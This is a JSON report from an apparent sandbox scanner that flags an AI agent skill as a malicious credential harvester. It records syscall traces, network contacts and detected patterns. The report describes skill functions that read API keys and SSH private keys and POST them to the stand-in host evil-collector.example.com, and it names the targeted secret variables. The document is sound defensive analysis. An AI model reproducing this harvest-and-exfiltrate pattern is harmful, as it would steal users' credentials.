@@ -1,0 +1,302 @@
+{
+  "status": "ok",
+  "outdir": "workshop_malicious_output_final/batch_detect_malicious/Charpup-skill-security-auditor-credential-harvester-skill",
+  "skill_name": "Charpup-skill-security-auditor-credential-harvester-skill",
+  "documented_purpose": "Dynamic analysis of installed agent skill based on observed runtime behavior",
+  "verdict": "malicious",
+  "score": 100.0,
+  "score_scale": "0-100",
+  "confidence": "high",
+  "num_patterns": 5,
+  "num_raw_patterns": 5,
+  "num_executed_patterns": 1,
+  "num_intent_only_patterns": 4,
+  "num_executed_malicious_patterns": 1,
+  "num_high_executed_patterns": 1,
+  "num_medium_executed_patterns": 0,
+  "num_strong_intent_patterns": 1,
+  "num_supporting_intent_patterns": 3,
+  "binary_mode": true,
+  "malicious_threshold": 80.0,
+  "suspicious_threshold": 40.0,
+  "aggregation_formula": "min(100, max(S) + 0.1 * sum(S_except_max)); high-risk executed evidence is >=100, strong blocked intent is >=85, weak/supporting-only evidence is capped at 60, and noise-only evidence is capped at 30",
+  "severity_weights": {
+    "low": 40,
+    "medium": 70,
+    "high": 100
+  },
+  "reason": "Dynamic risk score 100.0 exceeded the malicious threshold 80.0.",
+  "network_indicators": {
+    "contacted_domains": [
+      "api.anthropic.com",
+      "elliott.ns.cloudflare.com",
+      "evil-collector.example.com",
+      "evil-collector.example.com.asia-southeast2-a.c.cs-poc-t2pujzx25dhamp5fwmxhcwi.internal",
+      "evil-collector.example.com.c.cs-poc-t2pujzx25dhamp5fwmxhcwi.internal",
+      "evil-collector.example.com.google.internal",
+      "http-intake.logs.us5.datadoghq.com",
+      "ns.asia-southeast2.gcedns-prod.internal",
+      "ns.global.gcedns-prod.internal"
+    ],
+    "contacted_ips": [
+      "172.17.0.2",
+      "169.254.169.254",
+      "160.79.104.10",
+      "34.149.66.137"
+    ],
+    "contacted_urls": [],
+    "embedded_urls": [
+      "https://evil-collector.example.com/collect",
+      "https://evil-collector.example.com/collect`,"
+    ]
+  },
+  "execution_indicators": {
+    "command_patterns": [
+      "mkdir -p /home/appuser/workdir && echo dummy > /home/appuser/workdir/sample.txt",
+      "python3 --version",
+      "python3 -m py_compile TOOL.py  (syntax check only, no execution of functions)",
+      "python3 import of TOOL.py via importlib (module-level only; defines functions, runs NO harvesting)",
+      "python3 existence-only check of targeted env vars (no values printed)",
+      "python3 existence-only check of ~/.ssh (no key files opened)",
+      "python3 socket.getaddrinfo('evil-collector.example.com',443)  (DNS resolution only, no connection, no payload)",
+      "43    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x5d7804807130 /* 22 vars */) = 0",
+      "44    execve(\"/usr/bin/cat\", [\"cat\", \"/tmp/user_prompt.txt\"], 0x5d780480c900 /* 22 vars */ <unfinished ...>",
+      "56    execve(\"/usr/bin/git\", [\"/usr/bin/git\", \"config\", \"--get\", \"remote.origin.url\"], 0x247f2b74510 /* 28 vars */) = 0",
+      "58    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--version\"], 0x247f2d8c650 /* 24 vars */) = 0",
+      "59    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--no-config\", \"--files\", \"--hidden\", \"--no-ignore\", \"--max-depth\", \"4\", \"--glob\", \".orphaned_at\", \"/home/appuser/.claude/plugins/cache\"], 0x247f2b76c10 /* 28 vars */) = 0",
+      "60    execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ps aux | grep -E \\\"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\\\" | grep -v grep\"], 0x247f3702310 /* 29 vars */) = 0",
+      "62    execve(\"/usr/bin/ps\", [\"ps\", \"aux\"], 0x649644095c38 /* 29 vars */ <unfinished ...>",
+      "63    execve(\"/usr/bin/grep\", [\"grep\", \"-E\", \"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\"], 0x649644095d18 /* 29 vars */) = 0",
+      "64    execve(\"/usr/bin/grep\", [\"grep\", \"-v\", \"grep\"], 0x649644095c68 /* 29 vars */ <unfinished ...>",
+      "66    execve(\"/bin/zsh\", [\"/bin/zsh\", \"--version\"], 0x247f3703490 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "67    execve(\"/usr/bin/zsh\", [\"/usr/bin/zsh\", \"--version\"], 0x247f3702a10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "68    execve(\"/usr/local/bin/zsh\", [\"/usr/local/bin/zsh\", \"--version\"], 0x247f3702d90 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "69    execve(\"/opt/homebrew/bin/zsh\", [\"/opt/homebrew/bin/zsh\", \"--version\"], 0x247f3703110 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "70    execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", \"env\"], 0x247f3703110 /* 32 vars */) = 0",
+      "70    execve(\"/usr/bin/env\", [\"env\"], 0x5ea9e69a07b0 /* 32 vars */) = 0",
+      "72    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x568fb036dc20 /* 31 vars */) = 0",
+      "74    execve(\"/usr/bin/cut\", [\"cut\", \"-d \", \"-f3\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "75    execve(\"/usr/bin/grep\", [\"grep\", \"-vE\", \"^_[^_]\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "78    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x568fb0375850 /* 31 vars */ <unfinished ...>",
+      "80    execve(\"/usr/bin/grep\", [\"grep\", \"on\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "81    execve(\"/usr/bin/awk\", [\"awk\", \"{print \\\"set -o \\\" $1}\"], 0x568fb0375850 /* 31 vars */ <unfinished ...>",
+      "82    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x568fb0375850 /* 31 vars */ <unfinished ...>",
+      "84    execve(\"/usr/bin/sed\", [\"sed\", \"s/^alias //g\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "85    execve(\"/usr/bin/sed\", [\"sed\", \"s/^/alias -- /\"], 0x568fb0375850 /* 31 vars */ <unfinished ...>",
+      "86    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x568fb0375850 /* 31 vars */ <unfinished ...>",
+      "87    execve(\"/usr/bin/cat\", [\"cat\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "88    execve(\"/usr/bin/cat\", [\"cat\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "89    execve(\"/usr/bin/cat\", [\"cat\"], 0x568fb0375850 /* 31 vars */) = 0",
+      "92    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"bfs\", \"-S\", \"dfs\", \"-regextype\", \"findutils-default\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill\", \"-type\", \"f\", \"-exec\", \"ls\", \"-la\", \"{}\", \";\"], 0x5d4f3d9b0250 /* 33 vars */) = 0",
+      "96    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/TOOL.py\"], 0x7ffe57e37318 /* 33 vars */) = 0",
+      "97    execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/SKILL.md\"], 0x7ffe57e37318 /* 33 vars */) = 0",
+      "100   execve(\"/usr/bin/mkdir\", [\"mkdir\", \"-p\", \"/home/appuser/workdir\"], 0x629167c31480 /* 34 vars */) = 0",
+      "101   execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/workdir\"], 0x629167c31480 /* 34 vars */) = 0",
+      "102   execve(\"/usr/local/bin/python3\", [\"python3\", \"--version\"], 0x629167c31480 /* 34 vars */) = 0",
+      "105   execve(\"/usr/local/bin/python3\", [\"python3\", \"-m\", \"py_compile\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/TOOL.py\"], 0x63634491d3c0 /* 34 vars */) = 0",
+      "108   execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"\\nimport importlib.util\\nspec = importlib.util.spec_from_file_location('tool', 'TOOL.py')\\nm = importlib.util.module_from_spec(spec)\\nspec.loader.exec_module(m)\\nprint('Module imported successfully.')\\nprint('Top-level callables defined:', [n for n in dir(m) if callable(getattr(m,n)) and not...",
+      "111   execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"\\nimport os\\n# Existence-only check of targeted env vars \\342\\200\\224 values are NEVER printed\\ntargets = ['OPENAI_API_KEY','ANTHROPIC_API_KEY','GITHUB_TOKEN','AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY']\\nfor t in targets:\\n    print(f'{t}: present={t in os.environ}')\\n# Existence-only check...",
+      "114   execve(\"/usr/local/bin/python3\", [\"python3\", \"-c\", \"\\nimport socket\\nhost = 'evil-collector.example.com'\\ntry:\\n    info = socket.getaddrinfo(host, 443)\\n    print('DNS resolved (unexpected):', info[0][4])\\nexcept Exception as e:\\n    print(f'DNS resolution for {host} failed/non-resolvable: {type(e).__name__}: {e}')\\nprint('No socket connecti..."
+    ],
+    "execution_parents": [
+      "id",
+      "cat",
+      "git",
+      "claude.exe",
+      "sh",
+      "ps",
+      "grep",
+      "zsh",
+      "bash",
+      "env",
+      "cut",
+      "head",
+      "awk",
+      "sed",
+      "ls",
+      "mkdir",
+      "python3"
+    ],
+    "tool_call_patterns": [
+      "mkdir -p /home/appuser/workdir && echo dummy > /home/appuser/workdir/sample.txt",
+      "python3 --version",
+      "python3 -m py_compile TOOL.py  (syntax check only, no execution of functions)",
+      "python3 import of TOOL.py via importlib (module-level only; defines functions, runs NO harvesting)",
+      "python3 existence-only check of targeted env vars (no values printed)",
+      "python3 existence-only check of ~/.ssh (no key files opened)",
+      "python3 socket.getaddrinfo('evil-collector.example.com',443)  (DNS resolution only, no connection, no payload)",
+      "{'command': 'collect_system_info()', 'reason': 'credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh'}",
+      "{'command': 'exfiltrate_data(data)  -> urllib POST to https://evil-collector.example.com/collect', 'reason': 'unsafe exfiltration / external action — sends harvested credentials to an attacker-controlled endpoint; silently swallows errors to evade detection'}",
+      "collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh",
+      "exfiltrate_data(data)  -> urllib POST to https://evil-collector.example.com/collect | reason: unsafe exfiltration / external action — sends harvested credentials to an attacker-controlled endpoint; silently swallows errors to evade detection"
+    ]
+  },
+  "file_indicators": {
+    "bundled_files": [],
+    "dropped_files": [
+      "{'path': '/home/appuser/.claude/.last-cleanup', 'after': '-rw-r--r--\\t24\\t2026-06-17 07:48:27.7264854920\\t/home/appuser/.claude/.last-cleanup'}",
+      "{'path': '/home/appuser/.claude/backups', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:51.2875828540\\t/home/appuser/.claude/backups'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682501962', 'after': '-rw-r--r--\\t33\\t2026-06-17 07:48:21.9633124210\\t/home/appuser/.claude/backups/.claude.json.backup.1781682501962'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682591287', 'after': '-rw-r--r--\\t24323\\t2026-06-17 07:49:51.2875828540\\t/home/appuser/.claude/backups/.claude.json.backup.1781682591287'}",
+      "{'path': '/home/appuser/.claude/policy-limits.json', 'after': '-rw-------\\t359\\t2026-06-17 07:48:22.5281365270\\t/home/appuser/.claude/policy-limits.json'}",
+      "{'path': '/home/appuser/.claude/projects', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:22.7143531110\\t/home/appuser/.claude/projects'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:27.6808698860\\t/home/appuser/.claude/projects/-home-appuser'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939.jsonl', 'after': '-rw-------\\t78681\\t2026-06-17 07:49:50.9743315780\\t/home/appuser/.claude/projects/-home-appuser/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939.jsonl'}",
+      "{'path': '/home/appuser/.claude/session-env', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:27.5194715950\\t/home/appuser/.claude/session-env'}",
+      "{'path': '/home/appuser/.claude/session-env/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:27.5194715950\\t/home/appuser/.claude/session-env/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939'}",
+      "{'path': '/home/appuser/.claude/sessions', 'after': 'drwx------\\t4096\\t2026-06-17 07:49:50.9580728150\\t/home/appuser/.claude/sessions'}",
+      "{'path': '/home/appuser/.claude/shell-snapshots', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:50.9610730160\\t/home/appuser/.claude/shell-snapshots'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/__pycache__', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:00.5564020080\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/__pycache__'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/__pycache__/TOOL.cpython-310.pyc', 'after': '-rw-r--r--\\t1573\\t2026-06-17 07:49:00.5561875260\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill/__pycache__/TOOL.cpython-310.pyc'}",
+      "{'path': '/home/appuser/workdir/sample.txt', 'after': '-rw-r--r--\\t23\\t2026-06-17 07:48:55.7521712240\\t/home/appuser/workdir/sample.txt'}",
+      "{'path': '/tmp/claude-1000', 'after': 'drwx------\\t4096\\t2026-06-17 07:48:27.5245094010\\t/tmp/claude-1000'}",
+      "{'path': '/tmp/claude-1000/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:27.5245094010\\t/tmp/claude-1000/-home-appuser'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:27.5250031380\\t/tmp/claude-1000/-home-appuser/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939/tasks', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:25.6953769350\\t/tmp/claude-1000/-home-appuser/ccfb9ff1-7450-4a35-bf91-a3a87e6fb939/tasks'}",
+      "{'path': '/tmp/fs_after.txt', 'after': '-rw-r--r--\\t0\\t2026-06-17 07:49:51.9871418960\\t/tmp/fs_after.txt'}",
+      "{'path': '/home/appuser', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:20.2909863480\\t/home/appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:51.2933399790\\t/home/appuser'}",
+      "{'path': '/home/appuser/.claude', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:20.2879861460\\t/home/appuser/.claude', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:27.7254854250\\t/home/appuser/.claude'}",
+      "{'path': '/home/appuser/.claude.json', 'before': '-rw-r--r--\\t33\\t2026-06-17 07:48:20.2909863480\\t/home/appuser/.claude.json', 'after': '-rw-r--r--\\t24406\\t2026-06-17 07:49:51.2898051610\\t/home/appuser/.claude.json'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:20.2967641190\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-credential-harvester-skill', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:49:00.5546892440\\t/home/appuser/.claude/skills/Charpup-skil...",
+      "{'path': '/home/appuser/workdir', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:20.2909863480\\t/home/appuser/workdir', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:48:55.7512215410\\t/home/appuser/workdir'}",
+      "{'path': '/tmp', 'before': 'drwxrwxrwt\\t4096\\t2026-06-17 07:48:21.3310561680\\t/tmp', 'after': 'drwxrwxrwt\\t4096\\t2026-06-17 07:49:51.9871418960\\t/tmp'}",
+      "{'path': '/tmp/fs_before.txt', 'before': '-rw-r--r--\\t0\\t2026-06-17 07:48:21.3310561680\\t/tmp/fs_before.txt', 'after': '-rw-r--r--\\t1578\\t2026-06-17 07:48:21.3350564360\\t/tmp/fs_before.txt'}"
+    ],
+    "file_patterns": [
+      "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "105   openat(AT_FDCWD, \"/usr/local/lib/python3.10/tokenize.py\", O_RDONLY|O_CLOEXEC) = 3",
+      "105   openat(AT_FDCWD, \"/usr/local/lib/python3.10/token.py\", O_RDONLY|O_CLOEXEC) = 3",
+      "/home/appuser/.claude/shell-snapshots"
+    ],
+    "certificate_fingerprints": []
+  },
+  "detected_malicious_patterns": [
+    {
+      "pattern": "possible_data_exfiltration",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 100.0,
+      "evidence_type": "corroborated",
+      "artifacts": [
+        "network.pcap",
+        "strace.log"
+      ],
+      "executed": true,
+      "pattern_confidence": "high",
+      "summary": "Sensitive file access correlated with suspicious outbound network activity.",
+      "evidence": {
+        "sensitive_file_access": [
+          "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+          "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+          "105   openat(AT_FDCWD, \"/usr/local/lib/python3.10/tokenize.py\", O_RDONLY|O_CLOEXEC) = 3",
+          "105   openat(AT_FDCWD, \"/usr/local/lib/python3.10/token.py\", O_RDONLY|O_CLOEXEC) = 3"
+        ],
+        "network": [
+          "api.anthropic.com",
+          "elliott.ns.cloudflare.com",
+          "evil-collector.example.com",
+          "evil-collector.example.com.asia-southeast2-a.c.cs-poc-t2pujzx25dhamp5fwmxhcwi.internal",
+          "evil-collector.example.com.c.cs-poc-t2pujzx25dhamp5fwmxhcwi.internal",
+          "evil-collector.example.com.google.internal",
+          "http-intake.logs.us5.datadoghq.com",
+          "ns.asia-southeast2.gcedns-prod.internal",
+          "ns.global.gcedns-prod.internal"
+        ]
+      },
+      "evidence_short": "file=46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>; network=api.anthropic.com"
+    },
+    {
+      "pattern": "credential_exfiltration_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains credential theft or data exfiltration intent indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "al purpose per tool.py code and docstrings: harvest api keys and ssh private keys from the host and exfiltrate them to an external server.\", \"files_inspected\": [ \"/home/appuser/.claude/skills/charpup-skill-security-auditor-credential-harvester-skill/skill.md\", \"/home/appuser/.claude/skills/charpup-skill-security-auditor-credential-harvester-skill/tool.py\" ], \"com",
+          "the code and its own docstrings (\"attempts to steal api keys and sensitive credentials\", \"malicious exfiltration endpoint\", \"send harvested data to external server\") confirm intent. the dangerous functions were identified and **not** executed; only benign, non-disclosing checks were",
+          "if __name__=='__main__' entrypoint. skill exposes only two library functions whose sole purpose is credential theft + exfiltration; there is no legitimate documented workflow to exercise.\" ], \"observed_errors\": [ \"socket.gaierror [errno -2] name o"
+        ],
+        "commands_skipped": [
+          "collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh",
+          "exfiltrate_data(data)  -> urllib POST to https://evil-collector.example.com/collect | reason: unsafe exfiltration / external action — sends harvested credentials to an attacker-controlled endpoint; silently swallows errors to evade detection"
+        ],
+        "skipped_unsafe_commands": [
+          "collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh",
+          "exfiltrate_data(data)  -> urllib POST to https://evil-collector.example.com/collect | reason: unsafe exfiltration / external action — sends harvested credentials to an attacker-controlled endpoint; silently swallows errors to evade detection"
+        ]
+      },
+      "evidence_short": "primitive=al purpose per tool.py code and docstrings: harvest api keys and ssh private keys from the host and exfiltrate them to an external server.\", \"files_inspected\": [ \"/home/appuser/...; command=collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh"
+    },
+    {
+      "pattern": "prompt_injection_or_manipulation",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 50.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Hidden instructions or instruction override detected in agent output.",
+      "evidence": {
+        "agent_hidden_instructions": [
+          "silently"
+        ],
+        "agent_instruction_override": []
+      },
+      "evidence_short": "instructions=silently"
+    },
+    {
+      "pattern": "sensitive_action_request",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 50.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Agent output requested access to sensitive credentials or private data.",
+      "evidence": {
+        "agent_sensitive_requests": [
+          "exfiltrate"
+        ]
+      },
+      "evidence_short": "request=exfiltrate"
+    },
+    {
+      "pattern": "unsafe_command_skipped",
+      "severity": "medium",
+      "base_weight": 70,
+      "effective_score": 35.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "medium",
+      "summary": "Unsafe command was identified and skipped during safe sandbox execution.",
+      "evidence": {
+        "skipped_unsafe_commands": [
+          "collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh",
+          "exfiltrate_data(data)  -> urllib POST to https://evil-collector.example.com/collect | reason: unsafe exfiltration / external action — sends harvested credentials to an attacker-controlled endpoint; silently swallows errors to evade detection"
+        ],
+        "unsafe_command_instructions": [
+          "credential",
+          "collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh",
+          "exfiltrate_data(data)  -> urllib POST to https://evil-collector.example.com/collect | reason: unsafe exfiltration / external action — sends harvested credentials to an attacker-controlled endpoint; silently swallows errors to evade detection"
+        ]
+      },
+      "evidence_short": "skipped=collect_system_info() | reason: credential required / accesses real secrets — reads API keys from environment and reads SSH private keys from ~/.ssh"
+    }
+  ]
+}
